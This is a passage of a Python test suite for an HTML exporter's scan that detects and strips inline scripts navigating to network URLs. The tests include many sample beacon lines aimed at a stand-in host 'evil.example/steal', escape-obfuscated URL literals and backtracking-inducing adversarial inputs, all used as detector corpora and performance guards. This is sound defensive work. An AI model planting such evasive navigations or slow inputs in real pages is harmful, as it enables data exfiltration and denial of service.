        grew superlinear, so a regression makes node run for minutes to hours. Without the timeout
        the run would HANG at exactly the moment the guard was meant to fire.
        """
        try:
            proc = subprocess.run([node, "-e", script], input=json.dumps(payload),
                                  capture_output=True, text=True, encoding="utf-8",
                                  timeout=timeout)
        except subprocess.TimeoutExpired:
            self.fail("node did not finish %s within %ds - the scan is superlinear again, which is "
                      "exactly what this guard exists to catch" % (what, timeout))
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate %s: %s" % (what, proc.stderr))
        return json.loads(proc.stdout)

    def test_the_navigation_pattern_behaves_the_same_in_the_real_js_engine(self):
        """Byte-identical pattern text is necessary but NOT sufficient - run the scan in node too.

        Compiling the extracted JS literals with Python's `re` (which the text-equality test above
        does) can only ever prove what PYTHON does with them; it structurally cannot catch an engine
        difference, which is exactly the class of bug this check hit. Now that the decision is a
        SCAN, text equality covers even less of it - the anchor pass, the backwards chain walk and
        the statement-start rule are code, not pattern - so the exporter's own source is evaluated
        here. Skipped when node is absent, the way the repo's other node-gated checks degrade - CI
        always has it.
        """
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        payload = {
            "navigates": self._NAV_CORPUS_NAVIGATES,
            "benign": self._NAV_CORPUS_BENIGN,
        }
        script = (
            self._runtime_nav_source() + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);"
            "process.stdout.write(JSON.stringify({"
            "navigates:p.navigates.map(_offlineScriptNavigatesToNetwork),"
            "benign:p.benign.map(_offlineScriptNavigatesToNetwork)}));});"
        )
        verdicts = self._run_nav_node(node, script, payload, "the navigation scan")
        # Length-check before zipping: `zip` truncates silently, so a helper that returned a short
        # (or empty) list would let this pass having asserted nothing.
        self.assertEqual(len(verdicts.get("navigates", [])), len(self._NAV_CORPUS_NAVIGATES),
                         "node returned %d verdicts for %d navigating samples"
                         % (len(verdicts.get("navigates", [])), len(self._NAV_CORPUS_NAVIGATES)))
        self.assertEqual(len(verdicts.get("benign", [])), len(self._NAV_CORPUS_BENIGN),
                         "node returned %d verdicts for %d benign samples"
                         % (len(verdicts.get("benign", [])), len(self._NAV_CORPUS_BENIGN)))
        for sample, hit in zip(self._NAV_CORPUS_NAVIGATES, verdicts["navigates"]):
            self.assertTrue(hit, "the REAL JS engine does not strip %r, so the exporter ships a "
                                 "beacon the Python validator rejects" % sample)
            self.assertTrue(resources.offline_script_navigates_to_network(sample),
                            "the validator does not reject %r" % sample)
        for sample, hit in zip(self._NAV_CORPUS_BENIGN, verdicts["benign"]):
            self.assertFalse(hit, "the REAL JS engine deletes the benign script %r" % sample)
            self.assertFalse(resources.offline_script_navigates_to_network(sample),
                             "the validator rejects the benign script %r" % sample)

    def _nav_cross_corpus(self):
        """Every head x chain x sink x operator x URL crossing, plus the awkward hand-written ones.

        Deterministic and generated rather than listed, because the shapes that matter are the
        near-misses at the JOINS - a boundary character, an optional-chaining dot, a chain that
        ends in whitespace - and those are combinations, not samples anybody thinks to write down.

        Keep every crossed fragment SHORT. The oracle these samples are compared against is the
        quadratic pattern itself, so a fragment that expands into a long near-match would resurrect
        the very cost this change removed, in the test rather than in the product.
        """
        corpus = ["".join(parts) for parts in itertools.product(
            self._NAV_CROSS_HEADS, self._NAV_CROSS_CHAINS, self._NAV_CROSS_SINKS,
            self._NAV_CROSS_OPS, self._NAV_CROSS_URLS)]
        corpus.extend([
            # A shorter chain matches where the longest one does not: the whitespace that ends the
            # chain element is itself a legal boundary, so this navigates even though `$` is not.
            '$window . location.href = "https://evil.example"',
            'a\nwindow . window . location.href = "https://evil.example"',
            'window.window.window.window.window.window.location.href = "https://evil.example"',
            '\u2028location = "https://evil.example"',
            '\ufefflocation.href = "https://evil.example"',
            'window\n.\nlocation\n=\n"https://evil.example"',
            "top?.open ( 'https://evil.example' )",
            'const location = { href: "" }; window.location.href = "https://evil.example";',
            'var l = location; l.href = "https://evil.example";',
            'x = location = "https://evil.example"',
            'if (x) { location = "https://evil.example" }',
        ])
        corpus.extend(self._NAV_CORPUS_NAVIGATES)
        corpus.extend(self._NAV_CORPUS_BENIGN)
        return corpus

    def test_the_navigation_scan_matches_the_pattern_it_replaced(self):
        """The linear scan must recognize EXACTLY what the repeated-prefix pattern recognized.

        The rewrite that made this check linear (see `_offlineNavSinkIndex`) is only safe if it is
        semantics-preserving in BOTH directions: a shape it stopped matching is an egress channel
        that silently reopened, and a shape it started matching is a benign script the exporter now
        deletes and the validator now rejects. The corpora above cover the shapes somebody thought
        to write down; this crosses their fragments so the near-misses at the JOINS are covered too,
        and compares every verdict against the frozen pattern.
        """
        corpus = self._nav_cross_corpus()
        self.assertGreater(len(corpus), 5000,
                           "the crossed corpus collapsed to %d samples; the equivalence pin is "
                           "only as good as what it crosses" % len(corpus))
        for sample in corpus:
            for oracle, prefixed_only, which in (
                    (self._LEGACY_NAV_FULL, False, "every"),
                    (self._LEGACY_NAV_PREFIXED, True, "the prefixed")):
                self.assertEqual(
                    resources.offline_nav_sink_index(sample, prefixed_only) >= 0,
                    bool(oracle.search(sample)),
                    "the linear scan and the pattern it replaced disagree about %s sink in %r. A "
                    "shape the scan stopped matching is an egress channel that silently reopened; "
                    "one it started matching is a benign script the exporter now deletes."
                    % (which, sample))

        # The crossed corpus is where the near-misses at the JOINS live, so it is the corpus most
        # worth putting through the OTHER engine too: the curated lists above are small enough that
        # a plausible drift in the hand-written walk (testing the boundary only at the longest chain,
        # say) passes every one of them and still breaks 129 crossed cases.
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine equivalence check needs it")
        script = (
            self._runtime_nav_source() + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);"
            "process.stdout.write(JSON.stringify(p.map(s=>["
            "_offlineNavSinkIndex(s,false)>=0,_offlineNavSinkIndex(s,true)>=0])));});"
        )
        verdicts = self._run_nav_node(node, script, corpus, "the crossed navigation corpus")
        self.assertEqual(len(verdicts), len(corpus),
                         "node returned %d verdicts for %d crossed samples"
                         % (len(verdicts), len(corpus)))
        for sample, (js_full, js_prefixed) in zip(corpus, verdicts):
            self.assertEqual(
                js_full, bool(self._LEGACY_NAV_FULL.search(sample)),
                "the REAL JS engine and the pattern the scan replaced disagree about every sink "
                "in %r" % sample)
            self.assertEqual(
                js_prefixed, bool(self._LEGACY_NAV_PREFIXED.search(sample)),
                "the REAL JS engine and the pattern the scan replaced disagree about the prefixed "
                "sink in %r" % sample)

    # The URL literals from the navigating corpus whose danger is a LANGUAGE claim rather than a
    # regex one, paired with the value the JavaScript parser actually produces. Each is the URL
    # LITERAL only (the sink around it is what the corpus above covers).
    _NAV_LITERAL_VALUES = [
        ('" https://evil.example/steal"', " https://evil.example/steal"),
        ('"ht\ttps://evil.example"', "ht\ttps://evil.example"),
        ('"\\\nhttps://evil.example/steal"', "https://evil.example/steal"),
        ('"ht\\\rtps://evil.example"', "https://evil.example"),
        ('`\\\u2028https:evil.example`', "https:evil.example"),
        ('"/\\\n/evil.example"', "//evil.example"),
        (r'"\\\\evil.example"', "\\\\evil.example"),
        (r'"\//evil.example"', "//evil.example"),
        (r'"\\\evil.example"', "\\evil.example"),
        (r'"\https://evil.example/steal"', "https://evil.example/steal"),
        (r'"htt\ps://evil.example"', "https://evil.example"),
        (r'"https\://evil.example"', "https://evil.example"),
        (r'"\ https://evil.example"', " https://evil.example"),
        (r'"\htt\ps\://evil.example"', "https://evil.example"),
        (r'"\\https://evil.example"', "\\https://evil.example"),
    ]

    def test_the_line_continuation_samples_really_are_the_urls_they_claim(self):
        """Pin the JavaScript-LANGUAGE claim the widening rests on, not just the regex.

        The tail now accepts a LineContinuation (a backslash followed by a line terminator) because
        it evaluates to NOTHING, so `"\\<LF>https://evil"` IS the bare URL - and it accepts an
        escaped slash and a doubled backslash because of how many source backslashes a string
        literal spends per runtime one. Every one of those is a claim about the JS PARSER, and the
        parity tests above only ever hand the engine a pre-built STRING, so a wrong claim would
        sail through them: the corpus would still be "matched", it just would not be a beacon.
        Evaluate the literals in node and compare against what each is asserted to mean.
        """
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-parser check needs it")
        payload = [src for src, _ in self._NAV_LITERAL_VALUES]
        script = (
            "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const lits=JSON.parse(raw);"
            "const out=lits.map(s=>{try{return {ok:true,v:(0,eval)('('+s+')')};}"
            "catch(e){return {ok:false,v:String(e&&e.message)};}});"
            "process.stdout.write(JSON.stringify(out));});"
        )
        proc = subprocess.run([node, "-e", script], input=json.dumps(payload),
                              capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate the URL literals: %s" % proc.stderr)
        got = json.loads(proc.stdout)
        self.assertEqual(len(got), len(self._NAV_LITERAL_VALUES),
                         "node returned %d values for %d literals"
                         % (len(got), len(self._NAV_LITERAL_VALUES)))
        for (src, expected), result in zip(self._NAV_LITERAL_VALUES, got):
            self.assertTrue(result["ok"],
                            "the JS parser rejects %r, so the corpus sample built from it is dead "
                            "source and proves nothing: %s" % (src, result["v"]))
            self.assertEqual(
                result["v"], expected,
                "the JS parser turns %r into %r, not the %r this change assumes - the sample is "
                "not the beacon (or the benign value) it is filed as"
                % (src, result["v"], expected))

    def _assert_reaches_local_binding_pass(self, evil, label):
        """The local-binding adversary must still ROUTE THROUGH the pass it is aimed at.

        `offline_script_navigates_to_network` answers and returns BEFORE that pass when no sink is
        found, so an unrelated change to SINK detection would leave this guard fast, green and
        guarding nothing. Assert the two conditions that put the expensive pass on the path.
        """
        self.assertGreaterEqual(
            resources.offline_nav_sink_index(evil, False), 0,
            "the %s adversary no longer trips the sink search, so the predicate answers before it "
            "reaches the local-binding scan and the budget below times nothing" % label)
        self.assertTrue(
            resources.offline_local_location_shadow(evil),
            "the %s adversary no longer registers a local binding, so it stops covering the "
            "pass it exists to time" % label)

    _NAV_CPU_BUDGET_SECONDS = 1.0

    def test_the_navigation_pattern_cannot_be_made_to_backtrack(self):
        """The scan must stay linear on adversarial input, in BOTH engines.

        It runs over every executable inline script of an offline document - which can include a
        multi-megabyte inlined mermaid bundle - on every `validate.py --strict`, and the exporter
        runs it on every export. Its prefix chain once joined two unbounded whitespace runs around
        an optional `?` (`WS*\\??WS*\\.`), so a whitespace run never followed by a dot made the
        engine try every split: a 20k-space input took ~2.7s in Python and ~10s in node, which is a
        denial of service on an attacker-authored document (and an accidental hang on a minified
        one). Each optional part is bound inside its own group now, so each position consumes the
        run one way. A second shape amplified the same way: several almost-matching sink segments
        whose tail never reaches a URL (`window<sp>.<sp>top<sp>.<sp>location<sp>.<sp>href<sp>=<sp>'x'`)
        took 18s in node at 200 spaces per gap. Both are checked here;
        `test_the_navigation_scan_stays_linear_as_the_near_match_grows` pins the SCALING that a
        single fixed-size input cannot see.
        """
        local_binding_evil = _NAV_LOCAL_BINDING_EVIL % (" " * 30000)
        evils = [
            "window" + " " * 20000 + "X",
            ("window{0}.{0}top{0}.{0}location{0}.{0}href{0}={0}'not-a-url'").format(" " * 400),
            "window . " * 200 + "x",
            # The URL literal now also accepts a SCHEME-ONLY spelling, so pin the near-miss that
            # arms that alternation at every sink and never completes it.
            'location.href = "https' * 2000,
            # It also tolerates the padding a browser strips and a scheme split by an ASCII tab,
            # which reintroduces unbounded runs exactly where the earlier ReDoS lived.
            'location.href = "' + " " * 20000,
            'location.href = "h' + "\t" * 20000,
            # A LineContinuation run is an alternation next to the padding run, the shape that
            # would reintroduce two ways to consume the same input if it were spelled loosely.
            'location.href = "' + "\\\n" * 10000,
            'location.href = "h' + "\\\r" * 10000,
            'window.location.href = "' + "\\\n" * 10000,
            ('location.href = "' + " " * 200) * 200,
            # The PREFIXED sinks carry the same widened tail, so arm them through a prefixed sink
            # too rather than trusting the shared tail text alone.
            'window.location.href = "' + " " * 20000,
            # The shape reported in #973: an almost-matching prefix chain that alternates TWO
            # global names across wide gaps and never reaches a sink at all. The anchored scan
            # answers it without a chain walk, but the corpus only ever carried a single-name,
            # single-space chain, so pin the reported spelling itself.
            ("window{0}.{0}top{0}.{0}").format(" " * 8) * 2000,
            # The LOCAL-BINDING pass is the other half of the predicate and runs over the WHOLE
            # script whenever a sink is found, so it needs its own adversary. The regex it replaced
            # joined two unbounded whitespace runs around an OPTIONAL identifier
            # (`function WS* IDENT{0,100} WS* \(`), which is the `WS*\??WS*\.` shape again: a run
            # never followed by `(` was split every possible way and each split re-ran the
            # `[^)]{0,400}location` search. The trailing sink plus `const location` is what makes
            # the predicate reach that pass and still answer False.
            local_binding_evil,
        ]
        # The shadow pass is a hand-written TOKENIZER now, so its own unbounded structures need
        # adversaries: the frame stack, the string scan and the regex-literal scan. The last one is
        # the interesting one - a regex literal that never terminates would be re-scanned to the
        # end of the line from every `/` after it, which is quadratic, so a failed scan poisons the
        # rest of that line instead.
        shadow_evils = [
            "(" * 20000 + _NAV_SHADOW_TAIL,
            "[/" * 20000 + _NAV_SHADOW_TAIL,
            ("'" + "a" * 20 + "\n") * 2000 + _NAV_SHADOW_TAIL,
            "`${x}`" * 5000 + _NAV_SHADOW_TAIL,
            "/*" + " " * 20000 + "*/" + _NAV_SHADOW_TAIL,
        ]
        for shadow_evil in shadow_evils:
            self._assert_reaches_local_binding_pass(shadow_evil, "fixed-size shadow tokenizer")
        evils.extend(shadow_evils)
        self._assert_reaches_local_binding_pass(local_binding_evil, "fixed-size local-binding")
        # Both patterns are fuzzed: they share the tail byte for byte, but only one of them was
        # ever driven with adversarial input, so a divergence in the prefixed copy could hide here.
        # Measure ENGINE WORK, not wall time: a shared Windows runner has descheduled node for 27s
        # during this guard. Process CPU time excludes that wait while the one-second ceiling still
        # fails the historical backtracking pattern before its larger scaling samples become costly.
        for evil in evils:
            start = time.process_time()
            self.assertFalse(resources.offline_script_navigates_to_network(evil))
            elapsed = time.process_time() - start
            self.assertLess(
                elapsed, self._NAV_CPU_BUDGET_SECONDS,
                "the navigation scan took %.2fs on a %d-character adversarial input - it is "
                "backtracking. Look for two unbounded repetitions that can consume the same input "
                "(the historical shape was `WS*\\??WS*\\.`); bind the optional part in its own "
                "group." % (elapsed, len(evil)))
        node = shutil.which("node")
        if not node:
            return
        script = (
            self._runtime_nav_source() + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);"
            "const out=p.evils.map(e=>{const t=process.cpuUsage();"
            "const hit=_offlineScriptNavigatesToNetwork(e);"
            "const cpu=process.cpuUsage(t);return {us:cpu.user+cpu.system,hit:hit};});"
            "process.stdout.write(JSON.stringify(out));});"
        )
        results = self._run_nav_node(node, script, {"evils": evils},
                                     "the adversarial navigation inputs")
        self.assertEqual(len(results), len(evils))
        for evil, result in zip(evils, results):
            self.assertFalse(result["hit"])
            self.assertLess(result["us"], int(self._NAV_CPU_BUDGET_SECONDS * 1000000),
                            "the REAL JS engine used %.1fms of CPU on a %d-character adversarial "
                            "input - "
                            "the exporter would hang the reviewer's browser tab on an "
                            "attacker-authored document" % (result["us"] / 1000, len(evil)))

    # Two near-match SHAPES, each at 10x steps, because they stress opposite halves of the scan.
    # `head + unit * n + tail` must never match, so the whole input is walked before the verdict.
    #  - the anchorless near-match arms the prefix chain and never reaches a sink at all: this is
    #    the shape the quadratic pattern died on, and 18 KB is the size it took 2.3s on, so the
    #    smallest step alone reds a regression in seconds rather than after the largest one has run
    #    for an hour;
    #  - the prefix chain puts ONE anchor behind n prefixes, so the cost is the BACKWARDS walk
    #    rather than the anchor pass. It really does touch every character, hence the smaller steps;
    #  - the statement-position near-sink repeats an ASSIGN-tail sink behind a long whitespace run
    #    that an `X` stops from ever qualifying, which is the only path the first two do not walk.
    #    Its steps are smaller again because Python pays a regex call per whitespace character here
    #    (1.3s on 1.7 MB, against 0.2s in node) - linear, but with the largest constant of the three.
    # The last field says whether the shape must be checked for still ROUTING through the
    # local-binding pass; it lives in the tuple rather than in a label comparison so renaming a
    # shape cannot silently drop the check.
    _NAV_SCALING_SHAPES = (
        ("anchorless near-match", "", "window . ", "x", (2000, 20000, 200000), False),
        ("prefix chain", "$", "frames.", 'location.href="https:"', (500, 5000, 50000), False),
        ("statement-position near-sink", "", "X" + " " * 500 + 'location = "//e"; ', "",
         (3, 30, 300), False),
        # The three above grow the SINK search. This one grows the LOCAL-BINDING search, the other
        # full-text pass the predicate makes, and it grows the whitespace RUN rather than a repeat
        # count because that is where its quadratic term lived: cost was one re-search of the
        # `[^)]{0,400}` window per split of the run, so n repeats of a fixed gap stayed linear and
        # hid it.
        ("local-binding whitespace run", _NAV_LOCAL_BINDING_EVIL.split("%s", 1)[0], " ",
         _NAV_LOCAL_BINDING_EVIL.split("%s", 1)[1], (500, 5000, 50000), True),
        # The shadow pass is a tokenizer, so grow the structures IT walks: the frame stack, and an
        # unterminated regex literal that every later `/` would re-scan to the end of the line if
        # the failed scan did not poison the rest of it.
        ("shadow frame nesting", "", "(", _NAV_SHADOW_TAIL, (500, 5000, 50000), True),
        ("shadow unterminated regex", "", "[/", _NAV_SHADOW_TAIL, (500, 5000, 50000), True),
        ("shadow unterminated quote", "", "'" + "a" * 20 + "\n", _NAV_SHADOW_TAIL,
         (50, 500, 5000), True),
        # The ASI rule that ends a dangling declaration reads the token AFTER a line break. Deciding
        # that by peeking FROM the break re-scanned the whole run of trivia at every newline in it,
        # which is quadratic: 20,000 newlines cost 57s in Python and 4.5s in node. The `,` keeps the
        # declaration open, so every newline in the run re-armed the peek.
        ("shadow declaration line breaks", "let x", "\n", ",location=1;" + _NAV_SHADOW_TAIL,
         (200, 2000, 20000), True),
    )
    def test_the_navigation_scan_stays_linear_as_the_near_match_grows(self):
        """A 10x longer near-match must not cost ~100x, in BOTH engines.

        The predicate was hardened against catastrophic BACKTRACKING once already, and the test
        above pins that. It was still QUADRATIC on a long NEAR-match, because the prefix chain was
        an unbounded repetition in front of the sink and the engine re-entered it at every position
        a prefix could follow: `"window . " * n` measured 2.3s at 18 KB, 9.4s at 36 KB, 36s at
        72 KB and 174s at 144 KB here - 4x the time for 2x the input. The existing guard used ~200
        repetitions, far below where that is visible, which is why a fixed-size input is not enough
        and this test measures the SCALING.

        It is cheap to trigger from a document: `_stripOfflineNetworkLoads` runs the predicate over
        every runnable script, and `_offlineLibBytesUnsafe` runs it over the vendored payload's
        INFLATED bytes, so a few hundred base64 bytes buy megabytes of near-match. The export runs
        in the reviewer's own browser, so the damage is an Export Offline that appears to hang - but
        an export that appears to hang is indistinguishable from a broken feature.
        """
        node = shutil.which("node")
        for label, head, unit, tail, steps, checks_binding_pass in self._NAV_SCALING_SHAPES:
            elapsed = []
            for n in steps:
                evil = head + unit * n + tail
                if checks_binding_pass:
                    self._assert_reaches_local_binding_pass(evil, label)
                start = time.process_time()
                self.assertFalse(resources.offline_script_navigates_to_network(evil),
                                 "the %s sample must NOT match, or the scan stops early and times "
                                 "nothing" % label)
                took = time.process_time() - start
                elapsed.append(took)
                self.assertLess(
                    took, self._NAV_CPU_BUDGET_SECONDS,
                    "the navigation scan took %.2fs on a %d-character %s. It is meant to cost one "
                    "pass over the input; a quadratic term is back." % (took, len(evil), label))
            # The absolute budgets above cannot be met by a quadratic implementation at the largest
            # step, but state the SCALING directly as well: 10x the input, at most 30x the time
            # (with a floor, because the fastest step is too quick to time reliably).
            self.assertLess(
                elapsed[-1], max(0.5, elapsed[-2] * 30),
                "the navigation scan took %.3fs on a %d-character %s and %.3fs on one 10x longer - "
                "that is superlinear growth, so the cost is quadratic again"
                % (elapsed[-2], len(head + unit * steps[-2] + tail), label, elapsed[-1]))

            if not node:
                continue
            script = (
                self._runtime_nav_source() + "\n"
                + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
                "const p=JSON.parse(raw);"
                "process.stdout.write(JSON.stringify(p.steps.map(n=>{"
                "const evil=p.head+p.unit.repeat(n)+p.tail;const t=process.cpuUsage();"
                "const hit=_offlineScriptNavigatesToNetwork(evil);"
                "const cpu=process.cpuUsage(t);"
                "return {us:cpu.user+cpu.system,hit:hit,len:evil.length};})));});"
            )
            payload = {"steps": list(steps), "head": head, "unit": unit, "tail": tail}
            results = self._run_nav_node(node, script, payload, "the %s timings" % label)
            self.assertEqual(len(results), len(steps),
                             "node returned %d timings for %d steps" % (len(results), len(steps)))
            for result in results:
                self.assertFalse(result["hit"])
                self.assertLess(
                    result["us"], int(self._NAV_CPU_BUDGET_SECONDS * 1000000),
                    "the REAL JS engine used %.1fms of CPU on a %d-character %s - the exporter "
                    "would hang "
                    "the reviewer's browser tab on a document that plants one, and the vendored "
                    "payload makes planting one cost a few hundred bytes"
                    % (result["us"] / 1000, result["len"], label))
            self.assertLess(
                results[-1]["us"], max(500000, results[-2]["us"] * 30),
                "the REAL JS engine used %.1fms of CPU on a %d-character %s and %.1fms on one 10x "
                "longer - "
                "that is superlinear growth"
                % (results[-2]["us"] / 1000, results[-2]["len"], label,
                   results[-1]["us"] / 1000))

    def test_the_layer_script_survives_its_own_offline_strips(self):
        """The review layer's own script is stripped by the same pass as any other inline script.

        It carries no id the strip skips and is not exempt, so the moment the layer's SOURCE (code
        or a code COMMENT) contains one of the shapes the strip looks for, the exporter deletes the
        runtime from every offline file it writes. That is not hypothetical: a comment added while
        building this very check spelled out both an `import` call and a navigation to a URL
        literal, and every offline export silently came out with an empty JS region. Pin it here,
        where the message names the cause, instead of leaving a whole browser suite to fail with
        "JS region has no closing script tag".
        """
        js_dir = os.path.join(_paths.DEV, "assets", "js")
        sources = {
            "the layer source partials (assets/js/*.js)":
                "\n".join(self._read(name) for name in sorted(os.listdir(js_dir))
                          if name.endswith(".js")),
        }
        # Also check the BUILT layer, not only the concatenated partials: the build could add a
        # prologue or reorder, and it is the built bytes that actually ship inside every export.
        # Required, not best-effort - making it conditional would let the only shipped-bytes check
        # silently vanish in exactly the environment where the build is broken.
        built = os.path.join(_paths.DEV, "skill", "dist", "commentable-html.js")
        self.assertTrue(os.path.exists(built),
                        "the built layer is missing at %s - run `python scripts/rebuild_all.py`; "
                        "this guard must check the bytes that actually ship, not only the source "
                        "partials" % built)
        with open(built, "r", encoding="utf-8", newline="") as fh:
            sources["the BUILT layer (skill/dist/commentable-html.js)"] = fh.read()
        # A sufficient condition, mirroring `_offlineScriptHasNetworkEgress`: the layer is full of
        # https literals (its own site and repo links), so its safety rests entirely on containing
        # no dynamic-import call and no navigation to a URL literal.
        forbidden = [
            (re.compile(r"\bimport\s*\("),
             "a dynamic import call (the strip's second import term pairs it with any quoted "
             "network URL literal, and the layer has several)"),
            (re.compile(r"\bfrom\s+[\"'](?:https?:)?//", re.IGNORECASE), "a remote `from` import"),
            (re.compile(r"\bimport\s+[\"'](?:https?:)?//", re.IGNORECASE), "a bare remote import"),
        ]
        for label, body in sources.items():
            # Script-data escape state, walked rather than pattern-matched. Inside the script
            # element that carries the layer, an HTML comment OPENER starts an escaped run, a start
            # tag inside that run starts a DOUBLE-escaped run, and only a comment CLOSER leaves
            # either. Text that ends still inside one is the failure: the layer's own end tag then
            # closes the run instead of the element, the runtime is swallowed, and every document
            # that embeds it silently comes up dead - with no error anywhere. This is the same
            # tokenizer rule `_cmhScriptDataClose` implements; here it is asserted about the
            # layer's OWN bytes. Prose may still discuss the shapes, as long as the runs balance.
            marker = re.compile("<" + "!--" + "|" + "--" + ">" + r"|</?script[\t\n\f\r />]",
                                re.IGNORECASE)
            escaped = doubled = False
            for hit in marker.finditer(body):
                token = hit.group(0).lower()
                if token == "<" + "!--":
                    escaped = True
                elif token == "--" + ">":
                    if doubled:
                        doubled = False
                    else:
                        escaped = False
                elif token.startswith("</"):
                    doubled = False
                elif escaped:
                    doubled = True
            self.assertFalse(
                escaped or doubled,
                "%s ends inside a script-data escaped run: an HTML comment opener in it is never "
                "closed, so the layer's own end tag would close the run instead of the script "
                "element and every document that embeds the runtime would silently lose it. "
                "Assemble the opener from pieces (`\"<\" + \"!--\"`), or close the comment." % label)
            for rx, what in forbidden:
                hit = rx.search(body)
                self.assertIsNone(
                    hit, "%s now contains %s (near %r). The offline export strips its OWN script "
                         "with that test, so every offline file would ship without the runtime. "
                         "Reword the comment, or restructure the code." % (
                             label, what,
                             body[max(0, (hit.start() if hit else 0) - 60):
                                  (hit.end() if hit else 0) + 60]))
            # The navigation half is a SCAN rather than a pattern, so it reports an index.
            at = resources.offline_nav_sink_index(body, False)
            self.assertEqual(
                at, -1, "%s now contains a scripted navigation to a network URL (near %r). The "
                        "offline export strips its OWN script with that test, so every offline "
                        "file would ship without the runtime. Reword the comment, or restructure "
                        "the code." % (label, body[max(0, at - 60):at + 60]))

    # Controls for the shared-scope declaration walk, asserted BEFORE the real bundle. A scan that
    # quietly reported nothing - a mis-read regex that swallowed the file, a scope key that landed
    # at the wrong depth - would otherwise satisfy the real assertion vacuously, which is the exact
    # failure mode a guard against silent drift must not have. Each entry is
    # (label, bundle, duplicate names it must report, names it must have seen at all). The last
    # six pin shapes the FIRST version of this walk got wrong, every one of them a silent
    # under-report that the leftover-stack and count self-checks did not notice.
    _SHARED_SCOPE_CONTROLS = (
        ("a redeclared top-level function (the #1183 shape: legal JS, the later one wins)",
         "(() => {\nfunction f(a) { return a; }\nfunction f(a) { return !a; }\n})();",
         {"f"}, {"f"}),
        ("a redeclared top-level const (a bundle-wide SyntaxError)",
         "(() => {\nconst R = /a/g;\nfunction use() { return R; }\nconst R = /b/g;\n})();",
         {"R"}, {"R", "use"}),
        ("a redeclared top-level class (also a SyntaxError)",
         "(() => {\nclass Box {}\nfunction use() { return Box; }\nclass Box {}\n})();",
         {"Box"}, {"Box", "use"}),
        ("a function and a const that collide across kinds",
         "(() => {\nfunction f() {}\nconst f = 1;\n})();", {"f"}, {"f"}),
        ("a redeclared async function and a generator",
         "(() => {\nasync function af() {}\nfunction* gf() {}\nasync function af() {}\n})();",
         {"af"}, {"af", "gf"}),
        ("a name repeated inside a multi-declarator list",
         "(() => {\nlet a = 1, b = 2;\nlet c = 3, b = 4;\n})();", {"b"}, {"a", "b", "c"}),
        ("the same LOCAL name in two function bodies (not a collision)",
         "(() => {\nfunction one() { const url = 1; return url; }\n"
         "function two() { const url = 2; return url; }\n})();", set(), {"one", "two"}),
        ("a shared-scope name that a NESTED block also binds (not a collision)",
         "(() => {\nconst v = 1;\nif (v) { const v = 2; log(v); }\n})();", set(), {"v"}),
        ("a named function or class EXPRESSION (binds only inside itself, not a collision)",
         "(() => {\nconst f = function inner() {};\nconst K = class Inner {};\n"
         "const g = c ? function inner() {} : null;\nconst h = async function inner() {};\n"
         "const inner = 1;\nconst Inner = 2;\n})();", set(), {"f", "K", "g", "h", "inner",
                                                             "Inner"}),
        ("the same declaration spelled in a string, a comment, a template and a regex",
         '(() => {\nfunction f() {}\nconst s = "function f() {}";\n// function f() {}\n'
         "const t = `function f() {} ${s} function f() {}`;\nconst r = /function f\\(\\) \\{\\}/;\n"
         "})();", set(), {"f", "s", "t", "r"}),
        ("division that is not a regex literal (a mis-read here swallows the rest of the file)",
         "(() => {\nconst a = 6 / 2;\nfunction mid() {}\nconst b = a / 2;\nfunction tail() {}\n"
         "})();", set(), {"a", "b", "mid", "tail"}),
        ("a duplicate hiding behind ASI (no semicolon ends the previous statement)",
         "(() => {\nconst seed = [1]\nfunction dup() {}\nfunction dup() {}\n})();",
         {"dup"}, {"seed", "dup"}),
        ("a duplicate hiding behind a postfix update before a division",
         "(() => {\nlet i = 0;\nconst half = i++ / 2;\nfunction dup() {}\nfunction dup() {}\n"
         "})();", {"dup"}, {"i", "half", "dup"}),
        ("a declarator list whose arrow body carries its own semicolon",
         "(() => {\nconst a = () => { return 1; }, dup = 2;\nconst dup = 3;\n})();",
         {"dup"}, {"a", "dup"}),
        ("a statement that only LOOKS like a declarator continuation",
         "(() => {\nlet first = 1\nlog(first)\nvalue, notADeclaration = 2;\n})();",
         set(), {"first"}),
        ("a declarator list wrapping AFTER a binary operator (the other half of ASI)",
         "(() => {\nvar a = one +\n  two, dup = 1;\nfunction dup() {}\n})();",
         {"dup"}, {"a", "dup"}),
        ("a declarator list wrapping after a keyword that demands an operand",
         "(() => {\nconst a = new\n  Thing(), dup = 2;\nconst dup = 3;\n})();",
         {"dup"}, {"a", "dup"}),
        ("a declarator list wrapping after typeof",
         "(() => {\nconst a = typeof\n  value, dup = 2;\nconst dup = 3;\n})();",
         {"dup"}, {"a", "dup"}),
        ("a declarator list whose initializer WRAPS onto a continuation line",
         "(() => {\nconst a = one\n  || two, dup = 2;\nconst dup = 3;\n})();",
         {"dup"}, {"a", "dup"}),
        ("a declarator list wrapping onto a member access",
         "(() => {\nconst a = obj\n  .prop, dup = 2;\nconst dup = 3;\n})();",
         {"dup"}, {"a", "dup"}),
        ("a declarator list wrapping onto an index",
         "(() => {\nvar a = table\n  [0], dup = 2;\nvar dup = 3;\n})();",
         {"dup"}, {"a", "dup"}),
        ("a declarator list wrapping across a ternary",
         "(() => {\nvar a = cond\n  ? 1\n  : 2, dup = 3;\nvar dup = 4;\n})();",
         {"dup"}, {"a", "dup"}),
        ("an object literal followed by a keyword operator inside a declarator list",
         "(() => {\nconst a = {} instanceof Object, dup = 2;\nconst dup = 3;\n})();",
         {"dup"}, {"a", "dup"}),
        ("a duplicate declared in an else branch (Annex B, binds at this scope)",
         "(() => {\nif (c) { g(); } else function dup() {}\nfunction dup() {}\n})();",
         {"dup"}, {"dup"}),
        ("a duplicate shared-scope var (legal JS; refused as a policy - the second wins)",
         "(() => {\nvar dup = 1;\nfunction use() { return dup; }\nvar dup = 2;\n})();",
         {"dup"}, {"dup", "use"}),
